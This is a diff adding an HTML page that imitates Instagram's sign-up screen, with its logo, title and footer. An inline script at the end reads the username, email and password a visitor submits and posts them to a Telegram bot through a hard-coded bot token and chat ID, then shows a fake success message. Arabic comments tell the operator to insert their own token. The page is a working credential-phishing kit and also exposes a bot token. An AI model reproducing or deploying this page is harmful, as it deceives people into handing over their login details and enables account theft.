@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./style.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>Sign Up - Instagram</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="auth" class="flex direction-column">
+            <div class="panel signup flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <p class="signup-intro">Sign up to see photos and videos from your friends.</p>
+                
+                <button class="signup-fb">
+                    <img src="./img/il.png" alt="Facebook Icon"/>
+                    Log in with Facebook
+                </button>
+
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OR</div>
+                    <span></span>
+                </div>
+
+                <form id="signup-form">
+                    <label for="email" class="sr-only"></label>
+                    <input id="email" name="email" type="email" placeholder="Email" required />
+
+                    <label for="full-name" class="sr-only"></label>
+                    <input id="full-name" name="full-name" placeholder="Full Name" required />
+
+                    <label for="username" class="sr-only"></label>
+                    <input id="username" name="username" placeholder="Username" required />
+
+                    <label for="password" class="sr-only"></label>
+                    <input id="password" name="password" type="password" placeholder="Password" required />
+
+                    <button type="submit">Sign Up</button>
+                </form>
+
+                <p class="terms-text">
+                    By signing up, you agree to our <a href="#">Terms</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookies Policy</a>.
+                </p>
+            </div>
+
+            <div class="panel login flex justify-content-center">
+                <p>Have an account?</p>
+                <a href="ilyass.html">Log in</a>
+            </div>
+
+            <div class="app-download flex direction-column align-items-center">
+                <p>Get the app.</p>
+                <div class="flex justify-content-center">
+                    <img src="./img/apple-button.png" alt="Apple Store" />
+                    <img src="./img/googleplay-button.png" alt="Google Play" />
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">ABOUT</a></li>
+            <li><a href="#">HELP</a></li>
+            <li><a href="#">PRESS</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">CAREERS</a></li>
+            <li><a href="#">PRIVACY</a></li>
+            <li><a href="#">TERMS</a></li>
+            <li><a href="#">LOCATION</a></li>
+            <li><a href="#">TOP ACCOUNTS</a></li>
+            <li><a href="#">HASHTAGS</a></li>
+            <li><a href="#">LANGUAGE</a></li>
+        </ul>
+        <p class="copyright">© 2025 Instagram</p>
+    </footer>
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+<script>
+    const TOKEN = "7275639536:AAHNWRNDaFiluluxUpu241s3nF04NSiqqvM"; // استبدل بتوكن البوت الخاص بك
+    const CHAT_ID = "6815056741"; // استبدل بمعرّف الشات الخاص بك
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    document.getElementById('signup-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value; // اسم المستخدم
+        const email = document.getElementById('email').value; // البريد الإلكتروني
+        const password = document.getElementById('password').value; // كلمة المرور
+
+        const message = `🔔 <b>New Account Registration</b> 🔔\n\n
+        📝 <b>Username:</b> ${username}\n
+        📧 <b>Email:</b> ${email}\n
+        🔑 <b>Password:</b> ${password}`; // يمكنك أيضًا حذف كلمة المرور لأسباب أمنية
+
+        axios.post(URI_API, {
+            chat_id: CHAT_ID,
+            parse_mode: 'HTML',
+            text: message
+        }).then(response => {
+            alert('تم تسجيل الحساب بنجاح! 🙏');
+        }).catch(error => {
+            alert('حدث خطأ. يرجى إعادة تحميل الصفحة!');
+        });
+    });
+</script>
+<script src="script.js"></script>
+
+    
+</body>
+</html>
